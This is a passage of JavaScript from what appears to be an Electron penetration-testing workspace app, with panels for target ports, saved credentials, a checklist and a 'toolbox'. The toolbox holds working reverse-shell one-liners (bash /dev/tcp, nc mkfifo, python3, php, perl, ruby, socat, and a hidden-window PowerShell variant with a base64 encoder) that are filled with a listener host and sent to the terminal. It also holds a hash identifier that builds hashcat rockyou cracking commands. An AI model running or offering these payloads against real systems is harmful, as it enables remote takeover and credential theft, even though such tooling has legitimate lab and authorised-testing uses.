  box.ports = typed
  box.portsManual = true
  saveBox(); renderPorts(); renderExamples()
  toast('Ports set by hand')
}
inPorts.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') { commitPorts(); term.focus() }
  else if (e.key === 'Escape') { renderPorts(); term.focus() }
})
inPorts.addEventListener('blur', commitPorts)
$('btn-ports-auto').onclick = async () => {
  box.portsManual = false
  box.ports = ''
  renderPorts()
  await autoPorts(true)
  saveBox(); renderPorts(); renderExamples()
  toast(box.ports ? `Ports from nmap: ${box.ports}` : 'No open ports in nmap output yet')
}

// ---------- CREDS ----------
const credInputs = ['cred-user', 'cred-pass', 'cred-hash', 'cred-note'].map($)
function renderCreds() {
  const list = $('cred-list')
  const on = !!target.workspace
  credInputs.forEach(i => { i.disabled = !on })
  $('cred-add').disabled = !on
  const count = $('cred-count')
  count.textContent = box.creds.length
  count.classList.toggle('hidden', !box.creds.length)
  list.innerHTML = ''
  if (!on) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
  if (!box.creds.length) {
    list.innerHTML = '<div class="empty">No creds yet.<br>Add a user + password or hash above.</div>'
    return
  }
  box.creds.forEach((c, i) => {
    const el = document.createElement('div')
    el.className = 'cred' + (i === box.activeCred ? ' active' : '')
    el.title = i === box.activeCred ? 'In use — click to stop using it' : 'Click to use in the playbook'
    el.innerHTML = `
      <div class="cred-top">
        <span class="cred-dot"></span>
        <span class="cred-user">${esc(c.user || '(no user)')}</span>
        ${i === box.activeCred ? '<span class="cred-tag">IN USE</span>' : ''}
      </div>
      ${c.pass ? '<div class="cred-line"><span class="k">pass</span><span class="v">••••••</span></div>' : ''}
      ${c.hash ? `<div class="cred-line"><span class="k">hash</span><span class="v">${esc(c.hash.length > 18 ? c.hash.slice(0, 18) + '…' : c.hash)}</span></div>` : ''}
      ${c.note ? `<div class="cred-note">${esc(c.note)}</div>` : ''}`
    const actions = document.createElement('div')
    actions.className = 'cred-actions'
    const addBtn = (label, title, fn) => {
      const b = document.createElement('button')
      b.className = 'mini ghost'
      b.textContent = label
      b.title = title
      b.onclick = (e) => { e.stopPropagation(); fn() }
      actions.appendChild(b)
    }
    const copy = async (what, val) => {
      const ok = await api.invoke('copy-text', val)
      toast(ok ? `Copied ${what}` : 'Copy failed')
    }
    if (c.pass) addBtn('copy pass', 'Copy password', () => copy('password', c.pass))
    if (c.hash) addBtn('copy hash', 'Copy hash', () => copy('hash', c.hash))
    addBtn('×', 'Delete this cred', () => {
      if (!confirm(`Delete cred "${c.user || '(no user)'}"?`)) return
      box.creds.splice(i, 1)
      if (box.activeCred === i) box.activeCred = -1
      else if (box.activeCred > i) box.activeCred--
      credsChanged()
    })
    el.appendChild(actions)
    el.onclick = () => {
      box.activeCred = box.activeCred === i ? -1 : i
      credsChanged()
      toast(box.activeCred === i ? `Using ${c.user || 'cred'} in the playbook` : 'Cred not in use')
    }
    list.appendChild(el)
  })
}
function credsChanged() {
  saveBox(); renderCreds(); renderExamples(); updateTargetDisplay()
}
function addCred() {
  const [user, pass, hash, note] = credInputs.map(i => i.value.trim())
  if (!user && !pass && !hash) { $('cred-user').focus(); return }
  box.creds.push({ user, pass, hash, note })
  // the first cred of a box goes straight into use — that's nearly always wanted
  if (box.activeCred < 0) box.activeCred = box.creds.length - 1
  credInputs.forEach(i => { i.value = '' })
  credsChanged()
  $('cred-user').focus()
  toast('Cred saved')
}
$('cred-add').onclick = addCred
credInputs.forEach(i => i.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCred() }))

// ---------- CHECKLIST ----------
const checkInput = $('check-input')
function renderChecklist() {
  const list = $('check-list')
  const on = !!target.workspace
  checkInput.disabled = !on
  $('check-add').disabled = !on
  $('check-reset').disabled = !on
  const items = box.checklist || []
  const done = items.filter(c => c.done).length
  const pct = items.length ? Math.round(done / items.length * 100) : 0
  $('check-bar').style.width = pct + '%'
  $('check-bar').classList.toggle('full', pct === 100 && items.length > 0)
  $('check-label').textContent = items.length ? `${done}/${items.length}` : ''
  const badge = $('check-count')
  badge.textContent = items.length ? `${done}/${items.length}` : ''
  badge.classList.toggle('hidden', !items.length)
  badge.classList.toggle('all-done', items.length > 0 && done === items.length)
  list.innerHTML = ''
  if (!on) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
  if (!items.length) { list.innerHTML = '<div class="empty">No steps. Add one above, or reset to the default list.</div>'; return }
  items.forEach((c, i) => {
    const el = document.createElement('div')
    el.className = 'check' + (c.done ? ' done' : '')
    const boxEl = document.createElement('span')
    boxEl.className = 'check-box'
    boxEl.textContent = c.done ? '✓' : ''
    const txt = document.createElement('span')
    txt.className = 'check-text'
    txt.textContent = c.text
    const del = document.createElement('span')
    del.className = 'check-del'; del.textContent = '×'; del.title = 'Remove this step'
    del.onclick = (e) => { e.stopPropagation(); box.checklist.splice(i, 1); checklistChanged() }
    el.append(boxEl, txt, del)
    el.onclick = () => { c.done = !c.done; checklistChanged() }
    list.appendChild(el)
  })
}
function checklistChanged() { saveBox(); renderChecklist() }
function addCheck() {
  const text = checkInput.value.trim()
  if (!text || !target.workspace) return
  box.checklist.push({ text, done: false })
  checkInput.value = ''
  checklistChanged()
}
$('check-add').onclick = addCheck
checkInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCheck() })
$('check-reset').onclick = async () => {
  if (!target.workspace) return
  if (!confirm('Reset this box to the default checklist? Your current steps are replaced.')) return
  box.checklist = undefined          // undefined -> main process re-seeds the template
  await api.invoke('write-box', box)
  box = await api.invoke('read-box')
  renderChecklist()
  toast('Checklist reset')
}

// ---------- FX (glow / scanlines / motion) ----------
function applyFx(on) {
  document.body.classList.toggle('fx-off', !on)
  $('btn-fx').classList.toggle('on', on)
  $('btn-fx').textContent = on ? 'FX' : 'FX off'
}
applyFx(prefs.get('fx', true))
$('btn-fx').onclick = () => {
  const on = document.body.classList.contains('fx-off')
  prefs.set('fx', on)
  applyFx(on)
  toast(on ? 'Effects on' : 'Effects off')
}

// ---------- TOOLBOX: reverse shells + hash ID ----------
const tbModal = $('modal-toolbox')
// %H / %P get replaced with host / port. Payloads are the common revshells set.
const SHELLS = {
  'bash-i':        `bash -c 'bash -i >& /dev/tcp/%H/%P 0>&1'`,
  'bash-196':      `0<&196;exec 196<>/dev/tcp/%H/%P; sh <&196 >&196 2>&196`,
  'sh':            `sh -i >& /dev/tcp/%H/%P 0>&1`,
  'nc-mkfifo':     `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %H %P >/tmp/f`,
  'nc-e':          `nc -e /bin/sh %H %P`,
  'python3':       `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("%H",%P));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
  'php':           `php -r '$sock=fsockopen("%H",%P);exec("/bin/sh -i <&3 >&3 2>&3");'`,
  'perl':          `perl -e 'use Socket;$i="%H";$p=%P;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  'ruby':          `ruby -rsocket -e'f=TCPSocket.open("%H",%P).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  'socat':         `socat TCP:%H:%P EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
  'powershell':    `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('%H',%P);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`
}
// PowerShell's -EncodedCommand wants the inner script as base64 of UTF-16LE
function psEncode(host, port) {
  const inner = SHELLS.powershell.replace(/^powershell -nop -W hidden -noni -c "/, '').replace(/"$/, '')
    .replace(/%H/g, host).replace(/%P/g, port)
  let bin = ''
  for (const ch of inner) { const c = ch.charCodeAt(0); bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff) }
  return 'powershell -nop -W hidden -e ' + btoa(bin)
}
function genShell() {
  const host = $('tb-lhost').value.trim() || '<lhost>'
  const port = ($('tb-lport').value.trim().match(/\d+/) || ['4444'])[0]
  const type = $('tb-shell-type').value
  const cmd = type === 'powershell-b64'
    ? psEncode(host, port)
    : SHELLS[type].replace(/%H/g, host).replace(/%P/g, port)
  $('tb-shell-out').textContent = cmd
  const listener = type === 'socat'
    ? `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`
    : `nc -lvnp ${port}`
  $('tb-listen-out').textContent = listener
  return { cmd, listener }
}
function openToolbox() {
  if (vpnIp && !$('tb-lhost').value.trim()) $('tb-lhost').value = vpnIp
  genShell()
  tbModal.classList.remove('hidden')
}
$('btn-toolbox').onclick = openToolbox
$('tb-close').onclick = () => tbModal.classList.add('hidden')
;['tb-lhost', 'tb-lport'].forEach(id => $(id).addEventListener('input', genShell))
$('tb-shell-type').addEventListener('change', genShell)
function tbSubTab(which) {
  $('tb-tab-shell').classList.toggle('active', which === 'shell')
  $('tb-tab-hash').classList.toggle('active', which === 'hash')
  $('tb-shell').classList.toggle('hidden', which !== 'shell')
  $('tb-hash').classList.toggle('hidden', which !== 'hash')
  if (which === 'hash') $('tb-hash-in').focus()
}
$('tb-tab-shell').onclick = () => tbSubTab('shell')
$('tb-tab-hash').onclick = () => tbSubTab('hash')
const sendToTerm = (text) => { api.send('term-insert', text); tbModal.classList.add('hidden'); term.focus(); toast('Sent to terminal') }
const copyText = async (text) => { const ok = await api.invoke('copy-text', text); toast(ok ? 'Copied' : 'Copy failed') }
$('tb-shell-copy').onclick = () => copyText(genShell().cmd)
$('tb-shell-insert').onclick = () => sendToTerm(genShell().cmd)
$('tb-listen-copy').onclick = () => copyText(genShell().listener)
$('tb-listen-insert').onclick = () => sendToTerm(genShell().listener)

// ---- hash identifier: regex rules, most specific first ----
const HASH_RULES = [
  { re: /^\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}$/, name: 'bcrypt', m: 3200, john: 'bcrypt' },
  { re: /^\$6\$/, name: 'sha512crypt (Unix)', m: 1800, john: 'sha512crypt' },
  { re: /^\$5\$/, name: 'sha256crypt (Unix)', m: 7400, john: 'sha256crypt' },
  { re: /^\$1\$/, name: 'md5crypt (Unix)', m: 500, john: 'md5crypt' },
  { re: /^\$apr1\$/, name: 'Apache apr1 (md5)', m: 1600, john: 'md5crypt' },
  { re: /^\$y\$/, name: 'yescrypt', m: null, john: 'crypt' },
  { re: /^\$krb5tgs\$23\$/, name: 'Kerberos 5 TGS-REP (RC4)', m: 13100, john: 'krb5tgs' },
  { re: /^\$krb5asrep\$23\$/, name: 'Kerberos 5 AS-REP (RC4)', m: 18200, john: 'krb5asrep' },
  { re: /^\$krb5tgs\$17\$/, name: 'Kerberos 5 TGS-REP (AES128)', m: 19600, john: 'krb5tgs' },
  { re: /^\$krb5tgs\$18\$/, name: 'Kerberos 5 TGS-REP (AES256)', m: 19700, john: 'krb5tgs' },
  { re: /^{SSHA}/, name: 'LDAP SSHA', m: 111, john: 'ssha' },
  { re: /^\*[A-F0-9]{40}$/i, name: 'MySQL 4.1+ (SHA1)', m: 300, john: 'mysql-sha1' },
  { re: /^[^\\/:*?"<>|]+::[^:]*:[a-f0-9]{16}:[a-f0-9]{32}:[a-f0-9]+$/i, name: 'NetNTLMv2', m: 5600, john: 'netntlmv2' },
  { re: /^[a-f0-9]{32}:[a-f0-9]{32}$/i, name: 'NTLMv1 / double-MD5', m: 5500, john: 'netntlm' },
  { re: /^[a-f0-9]{32}:.+$/i, name: 'md5($pass.$salt) or NTLM:salt', m: 10, john: 'dynamic' },
  { re: /^[a-f0-9]{128}$/i, name: 'SHA-512', m: 1700, john: 'raw-sha512' },
  { re: /^[a-f0-9]{96}$/i, name: 'SHA-384', m: 10800, john: 'raw-sha384' },
  { re: /^[a-f0-9]{64}$/i, name: 'SHA-256', m: 1400, john: 'raw-sha256' },
  { re: /^[a-f0-9]{56}$/i, name: 'SHA-224', m: 1300, john: 'raw-sha224' },
  { re: /^[a-f0-9]{40}$/i, name: 'SHA-1', m: 100, john: 'raw-sha1' },
  { re: /^[a-f0-9]{16}$/i, name: 'MySQL323', m: 200, john: 'mysql' },
]
// the 32-hex case is the big ambiguous one: MD5 vs NTLM vs more — list both
const HEX32 = [
  { name: 'MD5', m: 0, john: 'raw-md5' },
  { name: 'NTLM', m: 1000, john: 'nt' },
  { name: 'LM', m: 3000, john: 'lm' },
  { name: 'MD4', m: 900, john: 'raw-md4' },
]
function idHash(h) {
  h = h.trim()
  if (!h) return []
  if (/^[a-f0-9]{32}$/i.test(h)) return HEX32.slice()
  for (const r of HASH_RULES) if (r.re.test(h)) return [r]
  return []
}
function renderHashId() {
  const h = $('tb-hash-in').value
  const out = $('tb-hash-out')
  const hits = idHash(h)
  if (!h.trim()) { out.innerHTML = '<div class="empty">Paste a hash above.</div>'; return }
  if (!hits.length) { out.innerHTML = '<div class="empty">No match. Could be salted or an unusual format — try hashid / name-that-hash.</div>'; return }
  out.innerHTML = ''
  hits.forEach(hit => {
    const row = document.createElement('div')
    row.className = 'hash-hit'
    const mode = hit.m == null ? '—' : `-m ${hit.m}`
    row.innerHTML = `<span class="hash-name">${esc(hit.name)}</span>` +
      `<span class="hash-mode">hashcat ${esc(mode)}</span>` +
      `<span class="hash-john">john --format=${esc(hit.john)}</span>`
    if (hit.m != null) {
      const b = document.createElement('button')
      b.className = 'mini ghost'; b.textContent = 'crack'
      b.title = 'Send a hashcat command to the terminal'
      b.onclick = () => sendToTerm(`hashcat -m ${hit.m} '${h.trim().replace(/'/g, "")}' /usr/share/wordlists/rockyou.txt`)
      row.appendChild(b)
    }
    out.appendChild(row)
  })
}
$('tb-hash-in').addEventListener('input', renderHashId)

// ---------- KEYBOARD ----------
document.addEventListener('keydown', (e) => {
  // plain Ctrl+K is kill-line in the shell, so the shortcut needs Shift
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k') {
    e.preventDefault(); filterInput.focus(); filterInput.select()
  } else if (e.key === 'Escape') {
    for (const m of document.querySelectorAll('.modal')) m.classList.add('hidden')
    setupDropdown.classList.add('hidden')
  }
})

// ---------- INIT ----------
;(async () => {
  const info = await api.invoke('app-info')
  shellName = info.shell || 'shell'
  $('sb-version').textContent = `v${info.version} · electron ${info.electron}`
  checkVpn()
  await loadTarget()
  await loadWorkspaces()
  if (target.workspace) {
    const res = await api.invoke('set-workspace', target.workspace)
    currentOutDir = res.outputDir
  }
  await loadBox()
  updateDeleteBtn(); updateTermTitle(); clearOutputView()
  await checkEnv()
  startEnvPolling()
  await loadExamples()
  refreshOutput()
  term.focus()
})()
